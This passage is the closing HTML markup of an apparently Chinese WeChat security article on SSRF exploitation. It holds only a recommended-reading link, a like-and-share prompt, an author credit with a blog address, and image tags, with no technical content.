rgb(0, 0, 0);" class="js_darkmode__982" data-darkmode-bgcolor-16121757971827="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121757971827="#fff|rgb(255, 255, 255)" data-darkmode-color-16121757971827="rgb(163, 163, 163)" data-darkmode-original-color-16121757971827="#fff|rgb(163, 163, 163)|rgb(0, 0, 0)" data-darkmode-bgcolor-16126094530080="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16126094530080="#fff|rgb(255, 255, 255)" data-darkmode-color-16126094530080="rgb(163, 163, 163)" data-darkmode-original-color-16126094530080="#fff|rgb(163, 163, 163)|rgb(0, 0, 0)" data-darkmode-bgcolor-16152068985875="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152068985875="#fff|rgb(255, 255, 255)" data-darkmode-color-16152068985875="rgb(163, 163, 163)" data-darkmode-original-color-16152068985875="#fff|rgb(163, 163, 163)|rgb(0, 0, 0)" data-darkmode-bgcolor-16152089535502="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152089535502="#fff|rgb(255, 255, 255)" data-darkmode-color-16152089535502="rgb(163, 163, 163)" data-darkmode-original-color-16152089535502="#fff|rgb(163, 163, 163)|rgb(0, 0, 0)" style="color: rgb(0, 0, 0);"><strong data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)|rgb(0, 0, 0)" data-darkmode-bgcolor-16121757971827="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121757971827="#fff|rgb(255, 255, 255)" data-darkmode-color-16121757971827="rgb(163, 163, 163)" data-darkmode-original-color-16121757971827="#fff|rgb(163, 163, 163)|rgb(0, 0, 0)" data-darkmode-bgcolor-16126094530080="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16126094530080="#fff|rgb(255, 255, 255)" data-darkmode-color-16126094530080="rgb(163, 163, 163)" data-darkmode-original-color-16126094530080="#fff|rgb(163, 163, 163)|rgb(0, 0, 0)" data-darkmode-bgcolor-16152068985875="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152068985875="#fff|rgb(255, 255, 255)" data-darkmode-color-16152068985875="rgb(163, 163, 163)" data-darkmode-original-color-16152068985875="#fff|rgb(163, 163, 163)|rgb(0, 0, 0)" data-darkmode-bgcolor-16152089535502="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152089535502="#fff|rgb(255, 255, 255)" data-darkmode-color-16152089535502="rgb(163, 163, 163)" data-darkmode-original-color-16152089535502="#fff|rgb(163, 163, 163)|rgb(0, 0, 0)">推荐阅读：</strong></span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="background-color: rgb(255, 255, 255); letter-spacing: 0.544px; white-space: normal; font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__991" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16121757971827="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121757971827="#fff|rgb(255, 255, 255)" data-darkmode-color-16121757971827="rgb(163, 163, 163)" data-darkmode-original-color-16121757971827="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16126094530080="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16126094530080="#fff|rgb(255, 255, 255)" data-darkmode-color-16126094530080="rgb(163, 163, 163)" data-darkmode-original-color-16126094530080="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16152068985875="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152068985875="#fff|rgb(255, 255, 255)" data-darkmode-color-16152068985875="rgb(163, 163, 163)" data-darkmode-original-color-16152068985875="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16152089535502="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152089535502="#fff|rgb(255, 255, 255)" data-darkmode-color-16152089535502="rgb(163, 163, 163)" data-darkmode-original-color-16152089535502="#fff|rgb(163, 163, 163)" style="letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-size-adjust: auto;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;text-align: center;color: rgb(163, 163, 163) !important;"><br data-darkmode-bgcolor-16152068985875="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152068985875="#fff|rgb(255, 255, 255)" data-darkmode-color-16152068985875="rgb(163, 163, 163)" data-darkmode-original-color-16152068985875="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16152089535502="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152089535502="#fff|rgb(255, 255, 255)" data-darkmode-color-16152089535502="rgb(163, 163, 163)" data-darkmode-original-color-16152089535502="#fff|rgb(163, 163, 163)"  /></p><p data-darkmode-bgcolor-16152068985875="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152068985875="#fff|rgb(255, 255, 255)" data-style="background-color: rgb(255, 255, 255); font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__992" data-darkmode-bgcolor-16152089535502="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152089535502="#fff|rgb(255, 255, 255)" data-darkmode-color-16152089535502="rgb(163, 163, 163)" data-darkmode-original-color-16152089535502="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-size-adjust: auto;text-align: center;color: rgb(163, 163, 163) !important;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247494120&amp;idx=2&amp;sn=e659b4f88a4c40442d36d73f8eea9d96&amp;chksm=ec1cbcd7db6b35c1f493151004956b010056cdcc6378d197aade5bd3c559a787d7b28e22e3e9&amp;scene=21#wechat_redirect" textvalue="你已选中了添加链接的内容" data-itemshowtype="0" tab="innerlink" data-linktype="1" data-darkmode-bgcolor-16152089535502="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152089535502="#fff|rgb(255, 255, 255)" data-darkmode-color-16152089535502="rgb(163, 163, 163)" data-darkmode-original-color-16152089535502="#fff|rgb(163, 163, 163)" hasload="1" style="color: rgb(125, 144, 169);-webkit-tap-highlight-color: rgba(0, 0, 0, 0);cursor: pointer;"><span class="js_jump_icon h5_image_link" data-positionback="static" data-darkmode-bgcolor-16152089535502="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152089535502="#fff|rgb(255, 255, 255)" data-darkmode-color-16152089535502="rgb(163, 163, 163)" data-darkmode-original-color-16152089535502="#fff|rgb(163, 163, 163)" style="line-height: 0;"><img class="rich_pages" data-ratio="0.4269788182831661" data-s="300,640" data-type="jpeg" data-w="897" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/55_7HBDmCVia2biaeZhwzMt8ITMbEnGIA.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibVuhxbHrBQLfbnMFFe9SJT41vUS1XzgC0VZGHjuzp8zia9gbH7HBDmCVia2biaeZhwzMt8ITMbEnGIA/640?wx_fmt=jpeg'" style="border-width: 0px;border-style: initial;border-color: initial;border-radius: 45px;box-sizing: border-box !important;visibility: visible !important;width: 677px !important;"  /></span></a></p><p data-darkmode-bgcolor-16152068985875="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152068985875="#fff|rgb(255, 255, 255)" data-style="background-color: rgb(255, 255, 255); font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__993" data-darkmode-bgcolor-16152089535502="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152089535502="#fff|rgb(255, 255, 255)" data-darkmode-color-16152089535502="rgb(163, 163, 163)" data-darkmode-original-color-16152089535502="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-size-adjust: auto;text-align: center;color: rgb(163, 163, 163) !important;"><br data-darkmode-bgcolor-16152068985875="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152068985875="#fff|rgb(255, 255, 255)" data-darkmode-bgcolor-16152089535502="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152089535502="#fff|rgb(255, 255, 255)" data-darkmode-color-16152089535502="rgb(163, 163, 163)" data-darkmode-original-color-16152089535502="#fff|rgb(163, 163, 163)"  /></p><p data-darkmode-bgcolor-16152068985875="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152068985875="#fff|rgb(255, 255, 255)" data-style="background-color: rgb(255, 255, 255); font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__994" data-darkmode-bgcolor-16152089535502="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152089535502="#fff|rgb(255, 255, 255)" data-darkmode-color-16152089535502="rgb(163, 163, 163)" data-darkmode-original-color-16152089535502="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-size-adjust: auto;text-align: center;color: rgb(163, 163, 163) !important;"><span data-darkmode-bgcolor-16152068985875="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152068985875="#fff|rgb(255, 255, 255)" data-darkmode-color-16152068985875="rgb(255, 104, 39)" data-darkmode-original-color-16152068985875="#fff|rgb(255, 104, 39)" data-darkmode-bgcolor-16152089535502="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152089535502="#fff|rgb(255, 255, 255)" data-darkmode-color-16152089535502="rgb(255, 104, 39)" data-darkmode-original-color-16152089535502="#fff|rgb(163, 163, 163)|rgb(255, 104, 39)" style="color: rgb(255, 104, 39);"><strong data-darkmode-bgcolor-16152068985875="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152068985875="#fff|rgb(255, 255, 255)" data-darkmode-color-16152068985875="rgb(255, 104, 39)" data-darkmode-original-color-16152068985875="#fff|rgb(255, 104, 39)" data-darkmode-bgcolor-16152089535502="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152089535502="#fff|rgb(255, 255, 255)" data-darkmode-color-16152089535502="rgb(255, 104, 39)" data-darkmode-original-color-16152089535502="#fff|rgb(163, 163, 163)|rgb(255, 104, 39)">点赞 在看 转发</strong></span><br data-darkmode-bgcolor-16152068985875="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152068985875="#fff|rgb(255, 255, 255)" data-darkmode-bgcolor-16152089535502="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152089535502="#fff|rgb(255, 255, 255)" data-darkmode-color-16152089535502="rgb(163, 163, 163)" data-darkmode-original-color-16152089535502="#fff|rgb(163, 163, 163)"  /></p><p data-darkmode-bgcolor-16152068985875="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152068985875="#fff|rgb(255, 255, 255)" data-style="background-color: rgb(255, 255, 255); font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__995" data-darkmode-bgcolor-16152089535502="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152089535502="#fff|rgb(255, 255, 255)" data-darkmode-color-16152089535502="rgb(163, 163, 163)" data-darkmode-original-color-16152089535502="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-size-adjust: auto;text-align: center;color: rgb(163, 163, 163) !important;"><br data-darkmode-bgcolor-16152068985875="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152068985875="#fff|rgb(255, 255, 255)" data-darkmode-bgcolor-16152089535502="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152089535502="#fff|rgb(255, 255, 255)" data-darkmode-color-16152089535502="rgb(163, 163, 163)" data-darkmode-original-color-16152089535502="#fff|rgb(163, 163, 163)"  /></p><p data-darkmode-bgcolor-16152068985875="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152068985875="#fff|rgb(255, 255, 255)" data-style="background-color: rgb(255, 255, 255); font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; text-align: right; color: rgb(163, 163, 163) !important;" class="js_darkmode__996" data-darkmode-bgcolor-16152089535502="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152089535502="#fff|rgb(255, 255, 255)" data-darkmode-color-16152089535502="rgb(163, 163, 163)" data-darkmode-original-color-16152089535502="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-size-adjust: auto;text-align: right;color: rgb(163, 163, 163) !important;"><span data-darkmode-bgcolor-16152068985875="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152068985875="#fff|rgb(255, 255, 255)" data-darkmode-bgcolor-16152089535502="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152089535502="#fff|rgb(255, 255, 255)" data-darkmode-color-16152089535502="rgb(163, 163, 163)" data-darkmode-original-color-16152089535502="#fff|rgb(163, 163, 163)" style="font-size:12px;line-height:32px;;">原创投稿作者：Mr.Anonymous</span></p><p data-darkmode-bgcolor-16152068985875="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152068985875="#fff|rgb(255, 255, 255)" data-style="background-color: rgb(255, 255, 255); font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; text-align: right; color: rgb(163, 163, 163) !important;" class="js_darkmode__997" data-darkmode-bgcolor-16152089535502="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152089535502="#fff|rgb(255, 255, 255)" data-darkmode-color-16152089535502="rgb(163, 163, 163)" data-darkmode-original-color-16152089535502="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-size-adjust: auto;text-align: right;color: rgb(163, 163, 163) !important;"><span data-darkmode-bgcolor-16152068985875="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152068985875="#fff|rgb(255, 255, 255)" data-darkmode-bgcolor-16152089535502="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16152089535502="#fff|rgb(255, 255, 255)" data-darkmode-color-16152089535502="rgb(163, 163, 163)" data-darkmode-original-color-16152089535502="#fff|rgb(163, 163, 163)" style="font-size:12px;line-height:32px;;">博客:whoamianony.top</span></p><p style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><img class="rich_pages __bg_gif" data-ratio="0.5197505197505198" data-type="gif" data-w="962" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/56_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" style="box-sizing: border-box !important;visibility: visible !important;width: 677px !important;"  /></p>
                </div>
</div>
</body>
</html>